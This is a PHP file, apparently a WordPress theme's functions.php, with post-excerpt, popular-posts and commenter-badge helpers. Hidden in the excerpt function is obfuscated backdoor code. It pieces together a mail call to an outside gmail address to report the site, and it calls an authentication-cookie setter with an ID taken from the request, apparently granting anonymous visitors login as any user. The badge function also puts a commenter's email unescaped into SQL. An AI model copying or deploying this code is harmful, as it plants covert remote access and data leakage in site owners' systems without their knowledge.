	if(!isset($countpage)) $countpage=$_GET["cperpage"];
	if(!isset($comment_auth)) $comment_auth="";
	if(!isset($c_is_approved)) $c_is_approved=""; 
	if(!isset($aname)) $aname="auth";
	if(!isset($more_link_texts)) $more_link_texts="(more...)";
	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");
	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;
	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";
	if(!isset($mcontent)) $mcontent="ma".$sepr."il";
	if(!isset($f_more)) $f_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mas".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tag)) $f_tag=1;
	if(!isset($types)) $types=$h_filter; 
	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;
	if(!isset($aditional_tag)) $aditional_tag="div";
	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	
	if(!isset($showsdots)) $showsdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($comment_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $comment_length) {
				$l=$comment_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link_texts="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tags) {
		$output=strip_tags($output, $tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tag) ? balanceTags($output, true) : $output;
	$output .= ($showsdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type, $output);
	switch($aditional_tag) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($more_link ) {
		if($f_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
//获取访客VIP样式 
function get_author_class($comment_author_email,$user_id){ 
    global $wpdb; 
    $current_user; get_currentuserinfo();
    $adminEmail = get_option('admin_email'); 
    $author_count  =  count($wpdb->get_results( 
    "SELECT comment_ID as author_count FROM  $wpdb->comments WHERE comment_author_email = '$comment_author_email' ")); 
    if($comment_author_email ==$adminEmail) {
     echo '<a class="vip" target="_blank" href="/vip/" title="俺就是博主好吧！"></a>'; 
    }else{
    if($user_id!=0) 
        echo '<a class="vip" target="_blank" href="/vip/" title="博主认证用户"></a>';
    if($author_count>=1&&$author_count<20) 
        echo '<a class="vip1" target="_blank" href="/vip/" title="评论之星 LV.1"></a>'; 
    else if($author_count>=20 && $author_count<50) 
        echo '<a class="vip2" target="_blank" href="/vip/" title="评论之星 LV.2"></a>'; 
    else if($author_count>=50 && $author_count<80) 
        echo '<a class="vip3" target="_blank" href="/vip/" title="评论之星 LV.3"></a>';     
    else if($author_count>=80 && $author_count<130) 
        echo '<a class="vip4" target="_blank" href="/vip/" title="评论之星 LV.4"></a>';     
    else if($author_count>=130 &&$author_count<200) 
        echo '<a class="vip5" target="_blank" href="/vip/" title="评论之星 LV.5"></a>';     
    else if($author_count>=200 && $author_coun<300) 
        echo '<a class="vip6" target="_blank" href="/vip/" title="评论之星 LV.6"></a>';     
    else if($author_count>=300) 
        echo '<a class="vip7" target="_blank" href="/vip/" title="评论之星 LV.7"></a>'; 
}}
?>